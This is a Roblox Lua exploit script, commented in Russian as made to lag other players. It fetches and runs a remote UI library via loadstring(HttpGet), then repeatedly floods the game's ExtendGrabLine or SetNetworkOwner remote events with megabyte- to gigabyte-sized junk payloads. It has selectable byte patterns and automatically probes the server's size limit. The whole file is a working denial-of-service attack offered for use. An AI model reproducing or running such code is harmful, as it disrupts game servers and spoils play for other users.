--Скрипт был создан для того чтобы покетить игроков
local repo = "https://raw.githubusercontent.com/deividcomsono/Obsidian/main/"
local Library = loadstring(game:HttpGet(repo .. "Library.lua"))()

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

local Window = Library:CreateWindow({
    Title = "P",
    Footer = "Lag",
    ShowCustomCursor = false,
    EnableCompacting = true,
    SidebarCompacted = false,
    CornerRadius = 4
})

Library.ToggleKeybind = Enum.KeyCode.RightShift

local Tab = Window:AddTab("L", nil)

local packetLagActive = false
local packetLagSizeMB = 1.5
local loopDelay = 0.15
local showNotifications = false
local lagState1 = {
    selectedLagType = "Resonance",
    customLagText = "0",
    cachedData = "0",
    cacheBuilt = false,
    packetCount = 0
}

local Tab2 = Window:AddTab("L2", nil)
local packetLagActive2 = false
local packetLagSizeGB = 1
local loopDelay2 = 0.15
local showNotifications2 = false
local lagState2 = {
    selectedLagType = "Resonance",
    customLagText = "0",
    cachedData = "0",
    cacheBuilt = false,
    packetCount = 0
}

local allSymbolsPattern = ""
for i = 0, 255 do
    allSymbolsPattern = allSymbolsPattern .. string.char(i)
end

local Patterns = {
    Resonance = "0",
    ["The Worst Premium Free"] = "FLOPPA LOVES YOU ",
    ["The Worst Private"] = "Bliz_T HUB | FLOPPA LOVES YOU ",
    ["HammaM Root"] = "MISHA LUV PDD❤️❤️❤️",
    ["HammaM Rat"] = "🐀🐛",
    ["Zero Bits"] = "\0",
    ["Max Power"] = allSymbolsPattern
}

local function Notify(title, text)
    pcall(function()
        game.StarterGui:SetCore("SendNotification", {
            Title = title,
            Text = text,
            Duration = 2
        })
    end)
end

local function GetPattern(state)
    if state.selectedLagType == "Custom" then
        return (state.customLagText and state.customLagText ~= "") and state.customLagText or "0"
    end
    return Patterns[state.selectedLagType] or "0"
end

local function RebuildCache(state, sizeMB)
    local pattern = GetPattern(state)
    local bytes = math.floor(sizeMB * 1024 * 1024)
    if bytes <= 0 then
        state.cachedData = pattern:sub(1, 1)
    else
        local patternLen = #pattern
        if patternLen == 0 then
            pattern = "0"
            patternLen = 1
        end
        local repetitions = math.ceil(bytes / patternLen)
        state.cachedData = string.rep(pattern, repetitions):sub(1, bytes)
    end
    state.cacheBuilt = true
end

local function GetTargetRemote()
    local GrabEvents = ReplicatedStorage:FindFirstChild("GrabEvents")
    if not GrabEvents then return nil end
    return GrabEvents:FindFirstChild("ExtendGrabLine") or GrabEvents:FindFirstChild("SetNetworkOwner")
end

local function SendPacket(state, packetSizeMB, unit, notificationsEnabled)
    if not state.cacheBuilt then RebuildCache(state, packetSizeMB) end
    local remote = GetTargetRemote()
    if not remote then return end

    local startTime = tick()

    local success = pcall(function()
        if remote.ClassName == "RemoteFunction" then
            remote:InvokeServer(state.cachedData)
        else
            remote:FireServer(state.cachedData)
        end
    end)

    if not success then
        local maxSize = 1
        local step = 0.5
        
        while maxSize > 0.01 do
            local testSize = math.floor(maxSize * 1024 * 1024)
            local testData = string.rep("0", testSize)
            
            local testSuccess = pcall(function()
                if remote.ClassName == "RemoteFunction" then
                    remote:InvokeServer(testData)
                else
                    remote:FireServer(testData)
                end
            end)
            
            if testSuccess then
                local actualMB = math.floor(testSize / (1024 * 1024) * 100) / 100
                Notify("Лимит найден", "Макс размер: " .. actualMB .. " МБ")
                break
            end
            
            maxSize = maxSize - step
            task.wait(0.1)
        end
        
        return
    end

    local elapsed = tick() - startTime
    state.packetCount = state.packetCount + 1

    if notificationsEnabled then
        Notify("Packet Sent", string.format("%.1f %s | #%d | %.2fs", packetSizeMB, unit, state.packetCount, elapsed))
    end
end

task.spawn(function()
    while true do
        if packetLagActive then
            local startLoop = tick()
            pcall(function()
                SendPacket(lagState1, packetLagSizeMB, "MB", showNotifications)
            end)
            local elapsed = tick() - startLoop
            local waitTime = math.max(0.01, loopDelay - elapsed)
            task.wait(waitTime)
        else
            task.wait(0.1)
        end
    end
end)

task.spawn(function()
    while true do
        if packetLagActive2 then
            local startLoop = tick()
            pcall(function()
                SendPacket(lagState2, packetLagSizeGB * 1024, "GB", showNotifications2)
            end)
            local elapsed = tick() - startLoop
            local waitTime = math.max(0.01, loopDelay2 - elapsed)
            task.wait(waitTime)
        else
            task.wait(0.1)
        end
    end
end)

local LeftGroupBox = Tab:AddLeftGroupbox("Controls")
local RightGroupBox = Tab:AddRightGroupbox("Settings")

LeftGroupBox:AddToggle("T", {
    Text = "Lag active",
    Default = false,
    Callback = function(Value)
        packetLagActive = Value
    end
})

LeftGroupBox:AddToggle("Notifs", {
    Text = "Notifications",
    Default = false,
    Callback = function(Value)
        showNotifications = Value
    end
})

LeftGroupBox:AddButton({
    Text = "Single packet",
    Func = function()
        pcall(function()
            SendPacket(lagState1, packetLagSizeMB, "MB", showNotifications)
        end)
    end,
    DoubleClick = false
})

RightGroupBox:AddDropdown("LagTypeDropdown", {
    Values = {
        "Resonance",
        "The Worst Premium Free",
        "The Worst Private",
        "HammaM Root",
        "HammaM Rat",
        "Zero Bits",
        "Max Power",
        "Custom"
    },
    Default = 1,
    Multi = false,
    Text = "Lag type",
    Callback = function(Value)
        lagState1.selectedLagType = Value
        lagState1.cacheBuilt = false
    end
})

RightGroupBox:AddInput("CustomLagInput", {
    Default = "0",
    Numeric = false,
    Finished = false,
    Text = "Custom pattern",
    Placeholder = "Enter text...",
    Callback = function(Value)
        lagState1.customLagText = tostring(Value)
        if lagState1.selectedLagType == "Custom" then
            lagState1.cacheBuilt = false
        end
    end
})

RightGroupBox:AddSlider("S", {
    Text = "MB size",
    Default = 1.5,
    Min = 0.01,
    Max = 19,
    Rounding = 2,
    Compact = false,
    Callback = function(Value)
        packetLagSizeMB = Value
        lagState1.cacheBuilt = false
    end
})

RightGroupBox:AddSlider("D", {
    Text = "Delay sec",
    Default = 0.15,
    Min = 0.01,
    Max = 10,
    Rounding = 2,
    Compact = false,
    Callback = function(Value)
        loopDelay = Value
    end
})

local LeftGroupBox2 = Tab2:AddLeftGroupbox("Controls")
local RightGroupBox2 = Tab2:AddRightGroupbox("Settings")

LeftGroupBox2:AddToggle("T2", {
    Text = "Lag active",
    Default = false,
    Callback = function(Value)
        packetLagActive2 = Value
    end
})

LeftGroupBox2:AddToggle("Notifs2", {
    Text = "Notifications",
    Default = false,
    Callback = function(Value)
        showNotifications2 = Value
    end
})

LeftGroupBox2:AddButton({
    Text = "Single packet",
    Func = function()
        pcall(function()
            SendPacket(lagState2, packetLagSizeGB * 1024, "GB", showNotifications2)
        end)
    end,
    DoubleClick = false
})

RightGroupBox2:AddDropdown("LagTypeDropdown2", {
    Values = {
        "Resonance",
        "The Worst Premium Free",
        "The Worst Private",
        "HammaM Root",
        "HammaM Rat",
        "Zero Bits",
        "Max Power",
        "Custom"
    },
    Default = 1,
    Multi = false,
    Text = "Lag type",
    Callback = function(Value)
        lagState2.selectedLagType = Value
        lagState2.cacheBuilt = false
    end
})

RightGroupBox2:AddInput("CustomLagInput2", {
    Default = "0",
    Numeric = false,
    Finished = false,
    Text = "Custom pattern",
    Placeholder = "Enter text...",
    Callback = function(Value)
        lagState2.customLagText = tostring(Value)
        if lagState2.selectedLagType == "Custom" then
            lagState2.cacheBuilt = false
        end
    end
})

RightGroupBox2:AddSlider("S2", {
    Text = "GB size",
    Default = 1,
    Min = 1,
    Max = 100,
    Rounding = 0,
    Compact = false,
    Callback = function(Value)
        packetLagSizeGB = Value
        lagState2.cacheBuilt = false
    end
})

RightGroupBox2:AddSlider("D2", {
    Text = "Delay sec",
    Default = 0.15,
    Min = 0.01,
    Max = 10,
    Rounding = 2,
    Compact = false,
    Callback = function(Value)
        loopDelay2 = Value
    end
})
